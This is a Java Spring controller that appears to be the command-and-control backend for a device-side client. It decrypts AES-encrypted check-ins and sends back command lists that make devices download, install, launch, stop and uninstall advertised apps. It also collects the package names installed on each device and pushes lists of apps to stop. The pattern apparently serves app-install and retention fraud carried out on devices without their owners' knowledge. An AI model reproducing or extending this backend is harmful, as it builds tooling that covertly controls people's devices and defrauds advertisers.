package com.rot.controller;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONException;
import org.json.JSONObject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import com.rot.bean.Command;
import com.rot.bean.Config;
import com.rot.bean.Request;
import com.rot.bean.RetentionReportRequest;
import com.rot.bean.StopReportRequest;
import com.rot.bean.TaskRequest;
import com.rot.bean.TaskResponse;
import com.rot.bean.framework.Json;
import com.rot.entity.AdsDeviceStatEntity;
import com.rot.entity.AdsEntity;
import com.rot.entity.DeviceEntity;
import com.rot.entity.SettingEntity;
import com.rot.service.AdsDeviceStatService;
import com.rot.service.AdsService;
import com.rot.service.AdsStatService;
import com.rot.service.DateUtils;
import com.rot.service.DeviceService;
import com.rot.service.SettingService;
import com.rot.util.AES;
import com.rot.util.Utils;

@Controller
@RequestMapping("")
public class MainController extends AbstractController {
    protected Logger taskLogger = LoggerFactory.getLogger("task");
    protected Logger stopLogger = LoggerFactory.getLogger("stop");
    protected Logger retentionLogger = LoggerFactory.getLogger("retention");
    @Autowired
    AdsDeviceStatService adsDeviceStatService;
    @Autowired
    private AdsService adsService;
    @Autowired
    private DeviceService deviceService;
    @Autowired
    private AdsStatService statService;
    @Autowired
    private SettingService settingService;
    @RequestMapping(value = "/rot")
    public void execute(HttpServletRequest request, HttpServletResponse response) {
        JSONObject result = null;
        String time = request.getHeader("time");
        String password = Utils.generatePassword(time);
        JSONObject requestObj = null;
        try {
            if (StringUtils.isNotBlank(time)) {
                String rawData = request.getParameter("d");
                String data = AES.decode(rawData, password);
                requestObj = new JSONObject(data);
                int method = requestObj.optInt(Json.A);
                switch (method) {
                    case Request.TASK:
                        result = handleTask(request, requestObj);
                        break;
                    case Request.RETENTION_REPORT:
                        result = handleRetentionReport(request, requestObj);
                        break;
                    case Request.STOP_REPORT:
                        result = handleStopReport(request, requestObj);
                        break;
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        if (result == null) result = new JSONObject();
        write(response, AES.encode(result.toString(), password));
    }
    private JSONObject handleTask(HttpServletRequest httpRequest, JSONObject requestObj) {
        TaskRequest form = Json.optObj(TaskRequest.class, requestObj);
        DeviceEntity device = this.deviceService.loadDevice(form);
        SettingEntity setting = this.settingService.get();
        TaskResponse response = new TaskResponse();
        Throwable error = null;
        if (device != null) {
            response.config = getConfig(setting, device);
            List<Command> commands = new ArrayList<Command>();
            commands.addAll(this.getReportCommandList());
            commands.addAll(this.getActivateCommandList(device));
            commands.addAll(this.getInstallCommandList(device));
            response.commands = commands;
        } else {
            response.clearData = true;
        }
        JSONObject result = null;
        try {
            result = response.toJson();
        } catch (JSONException e) {
            taskLogger.error(e.getMessage(), e);
            error = e;
        }
        log(taskLogger, httpRequest, form, response, error);
        return result;
    }
    private JSONObject handleStopReport(HttpServletRequest request, JSONObject requestObj) {
        StopReportRequest form = null;
        TaskResponse response = null;
        Throwable error = null;
        try {
            form = Json.optObj(StopReportRequest.class, requestObj);
            // this.deviceService.loadDevice(form);
        } catch (Exception e) {
            stopLogger.error(e.getMessage(), e);
            error = e;
        }
        log(stopLogger, request, form, response, error);
        return null;
    }
    private JSONObject handleRetentionReport(HttpServletRequest httpRequest, JSONObject requestObj) {
        RetentionReportRequest form = null;
        DeviceEntity device = null;
        TaskResponse response = null;
        Throwable error = null;
        try {
            form = Json.optObj(RetentionReportRequest.class, requestObj);
            device = this.deviceService.loadDevice(form);
        } catch (Exception e) {
            retentionLogger.error(e.getMessage(), e);
            error = e;
        }
        if (device != null) {
            this.statService.saveStat(device, form.installedPackageNames);
        }
        log(retentionLogger, httpRequest, form, response, error);
        return null;
    }
    private Config getConfig(SettingEntity setting, DeviceEntity device) {
        Config config = new Config();
        config.backgroundOnly = setting.isBackgroundOnly();
        config.blackPackageNames = setting.getBlackPackageNames();
        config.deviceId = device.getId();
        config.requestInterval = setting.getRequestInterval();
        config.sdPath = setting.getSdPath();
        config.hostName = setting.getHostName();
        config.stopBlack = setting.isStopBlack();
        config.stopBlackReport = setting.isStopBlackReport();
        return config;
    }
    private List<Command> getActivateCommandList(DeviceEntity device) {
        ArrayList<Command> list = new ArrayList<Command>();
        List<AdsEntity> adsList = this.adsService.getActivateList();
        if (CollectionUtils.isNotEmpty(adsList)) {
            Set<Long> set = new HashSet<Long>();
            List<AdsDeviceStatEntity> statList = adsDeviceStatService.getDeviceStatByLastDate(device.getId(), DateUtils.format(new Date()));
            for (AdsDeviceStatEntity ele : statList) {
                set.add(ele.getAdsId());
            }
            for (AdsEntity ads : adsList) {
                if (set.contains(ads.getId())) {
                    list.add(this.generateActivateCommand(ads));
                }
            }
        }
        return list;
    }
    private List<AdsEntity> getInstallAds(DeviceEntity device) {
        List<AdsEntity> result = new ArrayList<AdsEntity>();
        List<AdsEntity> adsList = this.adsService.getInstallList();
        if (CollectionUtils.isNotEmpty(adsList)) {
            Set<Long> set = new HashSet<Long>();
            SettingEntity setting = this.settingService.get();
            for (AdsDeviceStatEntity ele : adsDeviceStatService.getDeviceStat(device.getId())) {
                set.add(ele.getAdsId());
            }
            Collections.shuffle(adsList);
            for (AdsEntity ads : adsList) {
                if (!set.contains(ads.getId())) {
                    result.add(ads);
                    if (result.size() >= setting.getInstallCount()) {
                        break;
                    }
                }
            }
        }
        return result;
    }
    private List<Command> getInstallCommandList(DeviceEntity device) {
        ArrayList<Command> list = new ArrayList<Command>();
        for (AdsEntity ads : getInstallAds(device)) {
            list.add(new Command(Command.METHOD_DOWNLOAD, ads.getDownloadUrl()));
            list.add(new Command(Command.METHOD_INSTALL, ads.getDownloadUrl(), true));
            list.add(generateActivateCommand(ads));
            list.add(new Command(Command.METHOD_RETENTION_REPORT, ads.getPackageName(), true));
            //停止
            list.add(new Command(Command.METHOD_DELAY, "20", true));
            list.add(new Command(Command.METHOD_STOP_APP, ads.getPackageName(), true));
            //卸载
            if (settingService.get().isUninstallAfterActivate()) {
                list.add(new Command(Command.METHOD_DELAY, "30", true));
                list.add(new Command(Command.METHOD_UNINSTALL, ads.getPackageName(), true));
            }
        }
        return list;
    }
    private Command generateActivateCommand(AdsEntity ads) {
        String component = ads.getPackageName() + "," + ads.getActivateComponent();
        int method = ads.getActivateMethod() == AdsEntity.ACTIVATE_BY_ACTIVITY ? Command.METHOD_START_ACTIVITY : Command.METHOD_START_SERVICE;
        return new Command(method, component, true);
    }
    private List<Command> getReportCommandList() {
        List<AdsEntity> adsList = this.adsService.getRetentionList();
        List<Command> result = new ArrayList<Command>();
        if (adsList != null && adsList.size() > 0) {
            result.add(new Command(Command.METHOD_RETENTION_REPORT, getPackageNames(adsList), true));
            //延迟几秒,以便统计留存信息
            result.add(new Command(Command.METHOD_DELAY, "5", true));
        }
        return result;
    }
    private String getPackageNames(List<AdsEntity> adsList) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < adsList.size(); i++) {
            sb.append(adsList.get(i).getPackageName());
            if (i < adsList.size() - 1) {
                sb.append(",");
            }
        }
        String ps = sb.toString();
        return ps;
    }
    public class LogInfo {
        public Object form;
        public Object response;
        public String error;
        LogInfo(Object request, Object response, Throwable error) {
            this.form = request;
            this.response = response;
            this.error = error == null ? null : Utils.getStatackTrace(error);
        }
    }
    private void log(Logger logger, HttpServletRequest request, Object form, Object response, Throwable error) {
        try {
            logger.info(WebUtils.getRemoteAddr(request) + "," + mapper.writeValueAsString(new LogInfo(form, response, error)));
        } catch (Exception e) {
            logger.error(e.getMessage(), e);
        }
    }
}
